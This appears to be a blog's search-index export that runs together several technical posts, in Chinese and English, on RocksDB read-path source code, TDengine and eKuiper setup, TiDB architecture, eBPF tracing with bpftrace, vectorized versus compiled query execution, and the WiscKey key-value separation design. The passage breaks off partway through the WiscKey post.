TableCache::Get123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109Status TableCache::Get(const ReadOptions&amp; options, const InternalKeyComparator&amp; internal_comparator, const FileMetaData&amp; file_meta, const Slice&amp; k, GetContext* get_context, const SliceTransform* prefix_extractor, HistogramImpl* file_read_hist, bool skip_filters, int level) { auto&amp; fd = file_meta.fd; std::string* row_cache_entry = nullptr; bool done = false;#ifndef ROCKSDB_LITE IterKey row_cache_key; std::string row_cache_entry_buffer; // Check row cache if enabled. Since row cache does not currently store // sequence numbers, we cannot use it if we need to fetch the sequence. if (ioptions_.row_cache &amp;&amp; !get_context-&gt;NeedToReadSequence()) { auto user_key = ExtractUserKey(k); CreateRowCacheKeyPrefix(options, fd, k, get_context, row_cache_key); done = GetFromRowCache(user_key, row_cache_key, row_cache_key.Size(), get_context); if (!done) { row_cache_entry = &amp;row_cache_entry_buffer; } }#endif // ROCKSDB_LITE Status s; TableReader* t = fd.table_reader; Cache::Handle* handle = nullptr; if (!done &amp;&amp; s.ok()) { if (t == nullptr) { s = FindTable( file_options_, internal_comparator, fd, &amp;handle, prefix_extractor, options.read_tier == kBlockCacheTier /* no_io */, true /* record_read_stats */, file_read_hist, skip_filters, level); if (s.ok()) { t = GetTableReaderFromHandle(handle); } } SequenceNumber* max_covering_tombstone_seq = get_context-&gt;max_covering_tombstone_seq(); if (s.ok() &amp;&amp; max_covering_tombstone_seq != nullptr &amp;&amp; !options.ignore_range_deletions) { std::unique_ptr&lt;FragmentedRangeTombstoneIterator&gt; range_del_iter( t-&gt;NewRangeTombstoneIterator(options)); if (range_del_iter != nullptr) { *max_covering_tombstone_seq = std::max( *max_covering_tombstone_seq, range_del_iter-&gt;MaxCoveringTombstoneSeqnum(ExtractUserKey(k))); } } if (s.ok()) { get_context-&gt;SetReplayLog(row_cache_entry); // nullptr if no cache. s = t-&gt;Get(options, k, get_context, prefix_extractor, skip_filters); get_context-&gt;SetReplayLog(nullptr); } else if (options.read_tier == kBlockCacheTier &amp;&amp; s.IsIncomplete()) { // Couldn't find Table in cache but treat as kFound if no_io set get_context-&gt;MarkKeyMayExist(); s = Status::OK(); done = true; } }#ifndef ROCKSDB_LITE // Put the replay log in row cache only if something was found. if (!done &amp;&amp; s.ok() &amp;&amp; row_cache_entry &amp;&amp; !row_cache_entry-&gt;empty()) { size_t charge = row_cache_key.Size() + row_cache_entry-&gt;size() + sizeof(std::string); void* row_ptr = new std::string(std::move(*row_cache_entry)); ioptions_.row_cache-&gt;Insert(row_cache_key.GetUserKey(), row_ptr, charge, &amp;DeleteEntry&lt;std::string&gt;); }#endif // ROCKSDB_LITE if (handle != nullptr) { ReleaseHandle(handle); } return s;}Status TableCache::FindTable(const FileOptions&amp; file_options, const InternalKeyComparator&amp; internal_comparator, const FileDescriptor&amp; fd, Cache::Handle** handle, const SliceTransform* prefix_extractor, const bool no_io, bool record_read_stats, HistogramImpl* file_read_hist, bool skip_filters, int level, bool prefetch_index_and_filter_in_cache) { ... std::unique_ptr&lt;TableReader&gt; table_reader; s = GetTableReader(file_options, internal_comparator, fd, false /* sequential mode */, record_read_stats, file_read_hist, &amp;table_reader, prefix_extractor, skip_filters, level, prefetch_index_and_filter_in_cache); if (!s.ok()) { assert(table_reader == nullptr); RecordTick(ioptions_.statistics, NO_FILE_ERRORS); // We do not cache error results so that if the error is transient, // or somebody repairs the file, we recover automatically. } else { s = cache_-&gt;Insert(key, table_reader.get(), 1, &amp;DeleteEntry&lt;TableReader&gt;, handle); if (s.ok()) { // Release ownership of table reader. table_reader.release(); } ... return s;} 如果 row_cache 打开，首先它会计算 row cache 的 key，再在row cache 中进行一次查找，如果有对应的值则直接返回结果，否则则将会在对应的 SST 读取传递进来的 key。 调用 FindTable，进行对应 table_reader 的读取以及进行 Table cache。 接下来调用 t-&gt;Get，从 Block cache 或者 SST 中读取数据。 最后，如果 row_cache 打开，把读取的数据插入到 row cache 中。 BlockBasedTable::Get12345678for (iiter-&gt;Seek(key); iiter-&gt;Valid()&amp;&amp;!done; iiter-&gt;Next()) { ... NewDataBlockIterator(&amp;biter); for(; biter.Valid; biter.Next()) { ... get_context-&gt;SaveValue(biter-&gt;Value()); }} 在 Table Cache 中，假设最终缓存的 table reader 是一个 BlockBasedTable 对象，调用 BlockBasedTable::Get。 首先，根据 Table 的元数据信息（布隆过滤器，数据块Index）查找 SST 内部的 Block。 调用 NewDataBlockIterator，若 Block 在 Block Cache 当中，直接返回对象地址，否则，发生磁盘IO，读取 SST 的 Block，构造 Block 对象并缓存其地址在 Block Cache 中。 找到 key 对应的 value，调用 get_context-&gt;SaveValue，直接将 Block 中的数据地址赋给用户传进来的 PinnableSlice* 中，减少了一次数据拷贝，并用引用计数避免 Block 被淘汰值被清除。 回顾 参考 Rocksdb Source Code 6.7.3 Rocksdb Code Analysis Get MySQL · RocksDB · 数据的读取(二) 使用PinnableSlice减少Get时的内存拷贝","link":"/2021/01/17/Rocksdb-Get/"},{"title":"TDengine 部署并与 Kuiper 交互","text":"安装和启动Ubuntu 系统使用 apt-get 工具从官方仓库安装 12345wget -qO - http://repos.taosdata.com/tdengine.key | sudo apt-key add -echo &quot;deb [arch=amd64] http://repos.taosdata.com/tdengine-stable stable main&quot; | sudo tee /etc/apt/sources.list.d/tdengine-stable.listsudo apt-get updateapt-cache policy tdenginesudo apt-get install tdengine 启动 1systemctl start taosd 执行 TDengine 客户端程序，只要在 Linux 终端执行 taos 即可 1taos 与 Kuiper 交互安装 TDengine 插件，注意当前 TDengine 客户端版本为 2.4.0.12 1curl -d &quot;{\\&quot;name\\&quot;:\\&quot;tdengine\\&quot;,\\&quot;file\\&quot;:\\&quot;https://packages.emqx.io/kuiper-plugins/1.4.3/debian/sinks/tdengine_amd64.zip\\&quot;,\\&quot;shellParas\\&quot;: [\\&quot;2.4.0.12\\&quot;]}&quot; http://127.0.0.1:9081/plugins/sinks 进入 TDengine 客户端，创建 test 用户 1create user test pass 'test'; 切换 test 用户，创建数据库和数据表 123456create database test;create stable sensordata (time timestamp,temperature float,humidity float) tags (location binary(64));create table bedroom_sensordata using sensordata tags(&quot;bedroom&quot;);create table balcony_sensordata using sensordata tags(&quot;balcony&quot;);create table toilet_sensordata using sensordata tags(&quot;toilet&quot;); 创建 device1、device2、device3 三个 stream，分别接收MQTT test/bedroom、test/balcony、test/toilet 主题消息 123kuiper create stream device1 '(temperature float, humidity float) WITH (FORMAT=&quot;JSON&quot;, DATASOURCE=&quot;test/bedroom&quot;)'kuiper create stream device2 '(temperature float, humidity float) WITH (FORMAT=&quot;JSON&quot;, DATASOURCE=&quot;test/balcony&quot;)'kuiper create stream device3 '(temperature float, humidity float) WITH (FORMAT=&quot;JSON&quot;, DATASOURCE=&quot;test/toilet&quot;)' 编写 demoRule1，demoRule2，demoRule3 规则 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# demoRule1{ &quot;sql&quot;: &quot;SELECT temperature,humidity FROM device1 WHERE isNull(temperature,humidity) = false&quot;, &quot;actions&quot;: [ { &quot;tdengine&quot;: { &quot;provideTs&quot;: false, &quot;tsFieldName&quot;: &quot;time&quot;, &quot;port&quot;: 0, &quot;ip&quot;: &quot;127.0.0.1&quot;, &quot;user&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;database&quot;: &quot;test&quot;, &quot;table&quot;: &quot;bedroom_sensordata&quot;, &quot;fields&quot;: [ &quot;temperature&quot;, &quot;humidity&quot; ] } }, { &quot;log&quot;: {} } ]}# demoRule2{ &quot;sql&quot;: &quot;SELECT temperature,humidity FROM device2 WHERE isNull(temperature,humidity) = false&quot;, &quot;actions&quot;: [ { &quot;tdengine&quot;: { &quot;provideTs&quot;: false, &quot;tsFieldName&quot;: &quot;time&quot;, &quot;port&quot;: 0, &quot;ip&quot;: &quot;127.0.0.1&quot;, &quot;user&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;database&quot;: &quot;test&quot;, &quot;table&quot;: &quot;balcony_sensordata&quot;, &quot;fields&quot;: [ &quot;temperature&quot;, &quot;humidity&quot; ] } }, { &quot;log&quot;: {} } ]}# demoRule3{ &quot;sql&quot;: &quot;SELECT temperature,humidity FROM device3 WHERE isNull(temperature,humidity) = false&quot;, &quot;actions&quot;: [ { &quot;tdengine&quot;: { &quot;provideTs&quot;: false, &quot;tsFieldName&quot;: &quot;time&quot;, &quot;port&quot;: 0, &quot;ip&quot;: &quot;127.0.0.1&quot;, &quot;user&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;database&quot;: &quot;test&quot;, &quot;table&quot;: &quot;toilet_sensordata&quot;, &quot;fields&quot;: [ &quot;temperature&quot;, &quot;humidity&quot; ] } }, { &quot;log&quot;: {} } ]} 创建 demoRule 规则 123kuiper create rule demoRule1 -f demoRule1kuiper create rule demoRule2 -f demoRule2kuiper create rule demoRule3 -f demoRule3 kuiper show rules，查看规则是否处于运行状态 123456789101112131415Connecting to 127.0.0.1:20498... [ { &quot;id&quot;: &quot;demoRule1&quot;, &quot;status&quot;: &quot;Running&quot; }, { &quot;id&quot;: &quot;demoRule2&quot;, &quot;status&quot;: &quot;Running&quot; }, { &quot;id&quot;: &quot;demoRule3&quot;, &quot;status&quot;: &quot;Running&quot; }] 用 Go 编写测试代码（见附录），向 MQTT Broker 发送温度和湿度数据。一段时间过后，在 TDengine 客户端查看接收到的数据 附录Go 发送消息测试完整代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;math/rand&quot; &quot;os&quot; &quot;time&quot; mqtt &quot;github.com/eclipse/paho.mqtt.golang&quot;)var f mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) { fmt.Printf(&quot;TOPIC: %s\\n&quot;, msg.Topic()) fmt.Printf(&quot;MSG: %s\\n&quot;, msg.Payload())}func genPair() (float64, float64) { t := (200.0 + float64(rand.Intn(120))) / 10.0 h := (500.0 + float64(rand.Intn(350))) / 10.0 return t, h}func genLocation() string { locations := []string{&quot;bedroom&quot;, &quot;balcony&quot;, &quot;toilet&quot;} i := rand.Intn(3) return locations[i]}func main() { mqtt.DEBUG = log.New(os.Stdout, &quot;&quot;, 0) mqtt.ERROR = log.New(os.Stdout, &quot;&quot;, 0) opts := mqtt.NewClientOptions().AddBroker(&quot;mqtt://175.178.160.127:1883&quot;) opts.SetKeepAlive(60 * time.Second) opts.SetDefaultPublishHandler(f) opts.SetPingTimeout(1 * time.Second) c := mqtt.NewClient(opts) if token := c.Connect(); token.Wait() &amp;&amp; token.Error() != nil { panic(token.Error()) } // pub msg loop for { t, h := genPair() payload := fmt.Sprintf(&quot;{\\&quot;temperature\\&quot;:%f, \\&quot;humidity\\&quot;:%f}&quot;, t, h) token := c.Publish(&quot;test/&quot;+genLocation(), 0, false, payload) token.Wait() // wait 10s time.Sleep(10 * time.Second) }}","link":"/2022/03/15/TDengine-%E9%83%A8%E7%BD%B2%E5%B9%B6%E4%B8%8E-Kuiper-%E4%BA%A4%E4%BA%92/"},{"title":"TiDB 架构","text":"TiDB是支持MySQL语法的开源分布式混合事务/分析处理（HTAP）数据库。TiDB 可以提供水平可扩展性、强一致性和高可用性。它主要由 PingCAP 公司开发和支持，并在 Apache 2.0 下授权。TiDB 从 Google 的 Spanner 和 F1 论文中汲取了最初的设计灵感。 HTAP 是 Hybrid Transactional / Analytical Processing 的缩写。这个词汇在 2014 年由 Gartner 提出。传统意义上，数据库往往专为交易或者分析场景设计，因而数据平台往往需要被切分为 TP 和 AP 两个部分，而数据需要从交易库复制到分析型数据库以便快速响应分析查询。而新型的 HTAP 数据库则可以同时承担交易和分析两种智能，这大大简化了数据平台的建设，也能让用户使用更新鲜的数据进行分析。作为一款优秀的 HTAP 数据数据库，TiDB 除了优异的交易处理能力，也具备了良好的分析能力。 TiDB在整体架构基本是参考 Google Spanner 和 F1 的设计，上分两层为 TiDB 和 TiKV。 TiDB 对应的是 Google F1，是一层无状态的 SQL Layer，兼容绝大多数 MySQL 语法，对外暴露 MySQL 网络协议，负责解析用户的 SQL 语句，生成分布式的 Query Plan，翻译成底层 Key Value 操作发送给 TiKV，TiKV 是真正的存储数据的地方，对应的是 Google Spanner，是一个分布式 Key Value 数据库，支持弹性水平扩展，自动的灾难恢复和故障转移（高可用），以及 ACID 跨行事务。值得一提的是 TiKV 并不像 HBase 或者 BigTable 那样依赖底层的分布式文件系统，在性能和灵活性上能更好，这个对于在线业务来说是非常重要。 TiDB Server：SQL 层，对外暴露 MySQL 协议的连接 endpoint，负责接受客户端的连接，执行 SQL 解析和优化，最终生成分布式执行计划。TiDB 层本身是无状态的，实践中可以启动多个 TiDB 实例，通过负载均衡组件（如 LVS、HAProxy 或 F5）对外提供统一的接入地址，客户端的连接可以均匀地分摊在多个 TiDB 实例上以达到负载均衡的效果。TiDB Server 本身并不存储数据，只是解析 SQL，将实际的数据读取请求转发给底层的存储节点 TiKV（或 TiFlash）。 PD (Placement Driver) Server：整个 TiDB 集群的元信息管理模块，负责存储每个 TiKV 节点实时的数据分布情况和集群的整体拓扑结构，提供 TiDB Dashboard 管控界面，并为分布式事务分配事务 ID。PD 不仅存储元信息，同时还会根据 TiKV 节点实时上报的数据分布状态，下发数据调度命令给具体的 TiKV 节点，可以说是整个集群的“大脑”。此外，PD 本身也是由至少 3 个节点构成，拥有高可用的能力。建议部署奇数个 PD 节点。 存储节点 TiKV Server：负责存储数据，从外部看 TiKV 是一个分布式的提供事务的 Key-Value 存储引擎。存储数据的基本单位是 Region，每个 Region 负责存储一个 Key Range（从 StartKey 到 EndKey 的左闭右开区间）的数据，每个 TiKV 节点会负责多个 Region。TiKV 的 API 在 KV 键值对层面提供对分布式事务的原生支持，默认提供了 SI (Snapshot Isolation) 的隔离级别，这也是 TiDB 在 SQL 层面支持分布式事务的核心。TiDB 的 SQL 层做完 SQL 解析后，会将 SQL 的执行计划转换为对 TiKV API 的实际调用。所以，数据都存储在 TiKV 中。另外，TiKV 中的数据都会自动维护多副本（默认为三副本），天然支持高可用和自动故障转移。 TiFlash：TiFlash 是一类特殊的存储节点。和普通 TiKV 节点不一样的是，在 TiFlash 内部，数据是以列式的形式进行存储，主要的功能是为分析型的场景加速。 TiKV 基于 RocksDB，采用了 Raft 协议来实现分布式的一致性。TiKV 的系统架构如下图所示： 优点： 纯分布式架构，拥有良好的扩展性，支持弹性的扩缩容 支持 SQL，对外暴露 MySQL 的网络协议，并兼容大多数 MySQL 的语法，在大多数场景下可以直接替换 MySQL 默认支持高可用，在少数副本失效的情况下，数据库本身能够自动进行数据修复和故障转移，对业务透明 支持 ACID 事务，对于一些有强一致需求的场景友好，例如：银行转账 具有丰富的工具链生态，覆盖数据迁移、同步、备份等多种场景 智能的行列混合模式，TiDB 可经由优化器自主选择行列。这套选择的逻辑与选择索引类似：优化器根据统计信息估算读取数据的规模，并对比选择列存与行存访问开销，做出最优选择 缺点： 虽然兼容MySQL，但是不支持存储过程，触发器，自定义函数，窗口功能有限 不适用数据量小的场景，专门为大数据量设计","link":"/2021/02/16/TiDB-%E6%9E%B6%E6%9E%84/"},{"title":"Ubuntu 安装使用 Kuiper","text":"下载和安装通过 https://github.com/lf-edge/ekuiper/releases 获取安装包 12wget https://github.com/lf-edge/ekuiper/releases/download/1.4.3/kuiper-1.4.3-linux-amd64.debsudo dpkg -i kuiper-1.4.3-linux-amd64.deb 启动 eKuiper 服务器 1sudo systemctl start kuiper 运行第一个规则流定义输入流创建一个名为 demo 的流，该流使用 DATASOURCE 属性中指定的 MQTT test 主题。 1kuiper create stream demo '(temperature float, humidity bigint) WITH (FORMAT=&quot;JSON&quot;, DATASOURCE=&quot;test&quot;)' MQTT 源将通过 tcp://localhost:1883 连接到 MQTT 消息服务器，如果 MQTT 消息服务器位于别的位置，请在etc/mqtt_source.yaml中进行修改。 1234default: qos: 1 sharedsubscription: true servers: [tcp://127.0.0.1:1883] 使用 kuiper show streams 命令来查看是否创建了 demo 流。 1kuiper show streams 通过查询工具测试流通过 kuiper query 命令对其进行测试 123kuiper querykuiper &gt; select count(*), avg(humidity) as avg_hum, max(humidity) as max_hum from demo where temperature &gt; 30 group by TUMBLINGWINDOW(ss, 5); 编写规则rule 由三部分组成： 规则名称：它必须是唯一的 sql：针对规则运行的查询 动作：规则的输出动作 myRule 文件的内容。对于在1分钟内滚动时间窗口中的平均温度大于30的事件，它将打印到日志中。 123456{ &quot;sql&quot;: &quot;SELECT temperature from demo where temperature &gt; 30&quot;, &quot;actions&quot;: [{ &quot;log&quot;: {} }]} 运行 kuiper rule 命令来创建 ruleDemo 规则 1kuiper create rule ruleDemo -f myRule 测试规则使用 MQTT 客户端将消息发布到 test 主题即可。消息应为 json 格式 12mosquitto_pub -h 192.168.181.97 -t &quot;test&quot; -m &quot;{\\&quot;temperature\\&quot;:31.2, \\&quot;humidity\\&quot;: 77}&quot;mosquitto_pub -h 192.168.181.97 -t &quot;test&quot; -m &quot;{\\&quot;temperature\\&quot;:29, \\&quot;humidity\\&quot;: 80}&quot; 查看日志 1tail -f /var/log/kuiper/stream.log 管理规则开启规则 1kuiper start rule ruleDemo 暂停规则 1kuiper stop rule ruleDemo 删除规则 1kuiper drop rule ruleDemo","link":"/2022/03/11/Ubuntu-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8-Kuiper/"},{"title":"eBPF Introduction","text":"What is eBPFeBPF (extended Berkeley Packet Filter) is a virtual machine that runs within the kernel. It allows the extension of kernel functionality in a safe and efficient manner without modifying kernel code or loading additional kernel modules. It is capable of running BPF programs, into which users can inject as needed for execution within the kernel. These programs adhere to a specific instruction set provided by eBPF, must follow certain rules, and only safe programs are allowed to run. The use of eBPF is on the rise, with an increasing number of eBPF programs being applied. For instance, replacing iptables rules with eBPF allows packets sent from applications to be directly forwarded to the socket of the recipient, effectively handling data packets by shortening the data path and accelerating the data plane. eBPF Core PrinciplesThe architecture diagram of eBPF is as follows: eBPF is divided into two parts: programs running in user space and programs running in kernel space. The user space program is responsible for loading the BPF bytecode into the eBPF virtual machine in the kernel space, and reading various event information and statistical information returned by the kernel when needed. The BPF virtual machine in the kernel is responsible for executing specific events in the kernel. If data transmission is required, the execution results are sent to the user space through the BPF map or perf-events in the perf buffer. The whole process is as follows: The written BPF program will be compiled into BPF bytecode by tools such as Clang, LLVM, etc. (because the BPF program is not a regular ELF program, but bytecode running in a virtual machine). The eBPF program will also include configured event sources, which are actually some hooks that need to be mounted. The loader will load it into the kernel via the eBPF system call before the program runs. At this time, the verifier will verify the safety of the bytecode, such as verifying that the number of loops must end within a limited time. Once the verification is passed and the mounted event occurs, the logic of the bytecode will be executed in the eBPF virtual machine. (Optional) Output each event individually, or return statistical data and call stack data through the BPF map, and transmit it to the user space. eBPF supports a number of major probes, such as static tracing of socket、tracepoint、USDT, and dynamic tracing of kprobe, uprobe, etc. Dynamic TracingeBPF provides: kprobe/kretprobe for the kernel, where k = kernel uprobe/uretprobe for applications, where u = userland These are used to detect information at the entry and return (ret) points of functions. kprobe/kretprobe can probe most kernel functions, but for security reasons, some kernel functions do not allow probe installation, which could lead to failure in tracing. uprobe/uretprobe are mechanisms to implement dynamic tracing of userland programs. Similar to kprobe/kretprobe, the difference is that the traced functions are in user programs. Dynamic tracing technology relies on the symbol table of the kernel and applications. For those inline or static functions, probes cannot be installed directly, and they need to be implemented through offset. The nm or strings command can be used to view the symbol table of the application. The principle of dynamic tracing technology is similar to GDB. When a probe is installed on a certain code segment, the kernel will copy the target position instruction and replace it with an int3 interrupt. The execution flow jumps to the user-specified probe handler, then executes the backed-up instruction. If a ret probe is also specified at this time, it will be executed. Finally, it jumps back to the original instruction sequence. Next, let’s see how to perform dynamic tracing. First, write a main.go test code: 123456789package mainfunc main() { println(sum(3, 3))}func sum(a, b int) int { return a + b} Next, disable inline optimization and compile the code by executing the go build -gcflags=&quot;-l&quot; ./main.go command. If inline optimization is enabled, it is likely that the Go compiler will eliminate function calls during compilation, so eBPF will not be able to find the probe corresponding to the function. The next step is to write a bpftrace script main.pt: 12345678BEGIN{ printf(&quot;Hello!\\n&quot;);}uprobe:./main:main.sum {printf(&quot;a: %d b: %d\\n&quot;, reg(&quot;ax&quot;), reg(&quot;bx&quot;))}uretprobe:./main:main.sum {printf(&quot;retval: %d\\n&quot;, retval)}END{ printf(&quot;Bye!\\n&quot;);} Finally, execute bpftrace to monitor this function call, run the bpftrace main.pt command, then press Ctl+C to exit, and get the following output: 1234Hello!a: 3 b: 3retval: 6^CBye! Static Tracing“Static” means that the probe’s position and name are hardcoded in the code and are determined at compile time. The implementation principle of static tracing is similar to callbacks: it is executed when activated, and not executed when deactivated, making it more performant than dynamic tracing. Among them: tracepoint is in the kernel USDT (Userland Statically Defined Tracing) is in the application Static tracing has already included probe parameter information in the kernel and applications, and you can directly access function parameters through args-&gt;parameter_name. You can check the parameter information of tracepoint through bpftrace -lv, for example: 12345678bpftrace -lv tracepoint:syscalls:sys_enter_openat# Output:# tracepoint:syscalls:sys_enter_openat# int __syscall_nr;# int dfd;# const char * filename;# int flags;# umode_t mode; Static tracing accesses the filename parameter of sys_enter_openat through args-&gt;filename: 123456789bpftrace -e 'tracepoint:syscalls:sys_enter_openat { printf(&quot;%s %s\\n&quot;, comm, str(args-&gt;filename)); }'# Output:# Attaching 1 probe...# uwsgi /proc/self/stat# uwsgi /proc/self/fd# uwsgi /proc/self/statm# uwsgi /proc/loadavg# uwsgi /proc/self/io# ... Here, comm represents the name of the parent process.","link":"/2022/12/27/eBPF-Introduction/"},{"title":"Vectorization vs. Compilation in Query Execution","text":"当代 CPU 特性超标量流水线与乱序执行CPU指令的执行可以分为5个阶段：取指令、指令译码、执行指令、访存取数、结果写回。 流水线：一套控制单元可以同时执行多条指令，不需要等到上一条指令执行完就可以执行下一条指令。 超标量：一个 CPU 核有多套控制单元，因此可以有多条 pipeline 并发执行。CPU 还会维护一个乱序执行的指令窗口，窗口中的无数据依赖的指令就可以被取来并发执行。并发指令越多越好，因为这样指令之间没有依赖，并发流水线的执行会更加的流畅。 分支预测遇到 if/switch 这种判断跳转的指令时会产生分支预测，分支预测系统会决定流水线接下来是载入紧挨着判断指令的下一条指令，还是载入跳转到另一个地址的指令。如果 CPU 的预测是正确的，那么判断指令结果出来的那一刻，真正需要执行的指令已经执行到尾声了，这时候只需要继续执行即可；如果CPU的预测是错误的，那么会把执行到尾声的错误指令全部清空，恢复到从未执行过的状态，然后再执行正确的指令。 程序分支越少或者是分支预测成功率越高，对流水线的执行就越有利，因为如果预测失败了，是要丢弃当前 pipeline 的所有指令重新 flush，这个过程往往会消耗掉十几个 CPU 周期。 多级存储与数据预取当数据在寄存器，cache 或者内存中，CPU 取数据的速度并不是在一个个数量级上的。CPU 取指令/数据的时候并不是直接从内存中取的，通常 CPU 和内存中会有多级缓存，分别为 L1，L2，L3 cache，其中 L1 cache 又可以分为 L1-data cache，L1-instruction cache。先从 cache 中取数据，若不存在，才访问内存。访问内存的时候会同时把访问数据相邻的一些数据一起加载进 cache 中。 预取指的是若数据存在线性访问的模式，CPU会主动把后续的内存块预先加载进cache中。 SIMD单指令多数据流，对于数据密集型的程序来说，可能会需要对大量不同的数据进行相同的运算。SIMD 引入了一组大容量的寄存器，比如 128 位，256 位。可以将这多个数据按次序同时放到一个寄存器。同时，CPU 新增了处理这种大容量寄存器的指令，可以在一个指令周期内完成多个数据的运算。 早期解释执行模型大多数的 query 解释器模型都是使用基于迭代器的火山模型，如下图所示。每个算子看成一个 iterator，iterator 会提供一个 next 方法，每个 next 方法只会产生一个 tuple，可以理解为一行数据。查询执行的时候，查询树自顶向下调用 next 接口，数据则自底向上被拉取处理，层层计算返回结果。所以火山模型属于 pull 模型。 Volcano 模型简单灵活，且这种设计不用占用过多的内存。火山模型将更多的内存资源用于磁盘 IO 的缓存设计而没有优化 CPU 的执行效率，这在当时的硬件基础上是很自然的权衡。但是现在 CPU 的硬件环境与大数据场景下，性能表现却差强人意。主要有如下几点原因： 时间都花在了query plan上，而不是计算上next 函数实现为虚函数，调用虚函数的时候要去查虚函数表，编译器无法对虚函数进行 inline 优化。同时会带来分支预测的开销，导致一次错误的 CPU 分支预测，需要多花费十几个 CPU 周期的开销。 CPU cache利用率低next 方法一次只返回一个元组，元组通常采用行存储，如果仅需访问其中某个字段但是每次都将整行数据填入 CPU cache，将导致那些不会被访问的字段也放在了 Cache 中，使得 cache 利用率非常低。 编译执行编译执行指的是运行时期的代码生成生成技术。在执行过程中生成编译执行代码，避免过多的虚函数调用和解析执行，因为在执行之初我们是知道关系代数的 Schema 信息。在具备 Schema 信息的情况下，事先生成好的代码，可以有效减少很多执行分支预测开销。 上图右边的代码非常紧凑，有效消除了字段个数，字段大小，字段类型，对于数据量特别多的处理场景，可以大大减少CPU开销，提高性能。 编译执行以数据为中心，消灭了火山模型中的大量虚函数调用开销。甚至使大部分指令执行，可以直接从寄存器取数，极大提高了执行效率。 在 Java 中通过 JIT 来实现，在 C++ 中通过 LLVM 来实现 codegen，对于 OLAP 这种运行时间较长的 query 来说，通常编译的时间是可以忽略的。 向量化执行向量可以理解为按列组织的一组数据，连续存储的一列数据，在内存中可以表示为一个向量。 向量模型和火山模型的本质区别就在于，数据处理的基本单元不再是按行组织的 tuple，而是按列组织的多个向量，我们常说的一个 chunk 其实就是多个 vector 的集合，就是多个列的意思。 向量化执行好处是：由于每次 next 都是处理一批数据，那么大大减少了虚函数调用的次数，分支预测的成功概率会提升，减少了分支预测的开销，并且充分发挥 SIMD 指令并行计算的优势；还可以和列式存储有效结合在一起，减少数据额外转换的 overhead。 向量化和编译执行比较向量化执行的主要访存开销在于像 join 这种算子的物化开销，物化就是从寄存器把数据读到内存中。而编译执行，tuple 可以一直留在寄存器中，一个 operator 处理完后，给另外一个 operator 继续处理。除非遇到不得不物化的情况。 向量化执行模型的循环较短，并发度高，可以同时有更多的指令等待取数。编译执行循环内部会包含多个 operator 的运算，这些有依赖关系的指令占据了大部分的乱序执行窗口，并发度低。 参考 Sompolski, J. , M. Zukowski , and P. A. Boncz . “Vectorization vs. Compilation in Query Execution.” International Workshop on Data Management on New Hardware ACM, 2011. S. Wanderman-Milne and N. Li, “Runtime Code Generation in Cloudera Impala,” IEEE Data Eng. Bull., vol. 37, no. 1, pp. 31–37, 2014. 向量化与编译执行浅析","link":"/2021/03/28/Vectorization-vs-Compilation-in-Query-Execution/"},{"title":"WiscKey: Separating Keys from Values in SSD-conscious Storage","text":"背景读写放大LSM-Tree key-value 存储存在读写放大的问题，例如对于LevelDB来说： 写放大：假如每一层的大小是上一层的 10 倍，那么当把 i-1 层中的一个文件合并到 i 层中时，LevelDB 需要读取 i 层中的文件的数量多达 10 个，排序后再将他们写回到 i 层中去。所以这个时候的写放大是 10。对于一个很大的数据集，生成一个新的 SSTable 文件可能会导致 L0-L6 中相邻层之间发生合并操作，这个时候的写放大就是50（L1-L6中每一层是10）。 读放大：(1) 查找一个 key-value 对时，LevelDB 可能需要在多个层中去查找。在最坏的情况下，LevelDB 在 L0 中需要查找 8 个文件，在 L1-L6 每层中需要查找 1 个文件，累计就需要查找 14 个文件。(2) 在一个 SSTable 文件中查找一个 key-value 对时，LevelDB 需要读取该文件的多个元数据块。所以实际读取的数据量应该是：index block + bloom-filter blocks + data block。例如，当查找 1KB 的 key-value 对时，LevelDB 需要读取 16KB 的 index block，4KB的 bloom-filter block 和 4KB 的 data block，总共要读取 24 KB 的数据。在最差的情况下需要读取 14 个 SSTable 文件，所以这个时候的写放大就是 24*14=336。较小的 key-value 对会带来更高的读放大。 WiscKey 论文中针对 LevelDB 测试的读写放大数据： 存储硬件在 SSD 上，顺序和随机读写性能差异不大。对于写操作而言，由于随机写会对 SSD 的寿命造成影响，顺序写的特性应该保留，对于读操作来说，顺序读和随机读的性能测试如下图所示： 每次请求数据的 size 越大，SSD 的随机读与顺序读差距越小，并发数越大，SSD 的随机读与顺序读差距也越小。 WiscKeyWiscKey 包括四个关键思想： (1) KV 分离，只有 key 在 LSM-Tree 上。(2) 在 KV 分离后，value 采用顺序追加写，不保序。因此范围查询中，WiscKey 使用并行 SSD 设备的随机读特性查询 value。(3) 使用 crash-consistency 和 garbage-collection 有效管理 value log。(4) 通过删除 LSM-Tree 日志而不牺牲一致性来优化性能。 KV 分离 KV 分离的设计要点如下： key 存在 LSM-Tree 上。 value 存在单独的 value log 中。 插入/更新数据的时候，首先将 value 追加到value log，然后将 key 插入 LSM-Tree 中。 删除数据的时候，只是将 key 在 LSM-Tree 中删除，value log 的数据不需要改变，因为 WiscKey 会有垃圾回收机制处理对应的 value。 读取数据时，先读 LSM-Tree，然后读 value log。 KV 分离对应的 ChallengesParallel Range Query 范围查询时，WiscKey 从 LSM-Tree 中读取多个 key 的元数据信息 &lt;key, address&gt;。 将这些 &lt;key, address&gt; 放入队列。 预读线程（默认32个）会从队列中获取 value 的地址，然后并行读取 value 数据。 Garbage Collection Value log 结构如图所示，其由 value_entry 组成，每个value_entry 是一个四元组 (key size, value size, key, value)。另外，Value log 有两个指针 head 和 tail，tail 指向 Value log 的起点；head 指向文件的尾部，所有新的数据都将追加到 head 位置。 垃圾回收时，线程将从 tail 指向的位置开始，每次读取一个 chunk 的数据（比如几MB），对于 chunk 中的每一个 value_entry，在 LSM-Tree 中查找 key 以便判断该 value_entry 是否仍然有效。如果有效，则将该条目追加到 head 指针指向的位置，并且需要更新 LSM-Tree 的记录，因为 value 的地址已经变了；如果无效，则将其舍弃。 同时，为了避免出现数据不一致（如在垃圾回收过程中发生了 crash），需要保证在释放对应的存储空间之前追加写入的新的有效 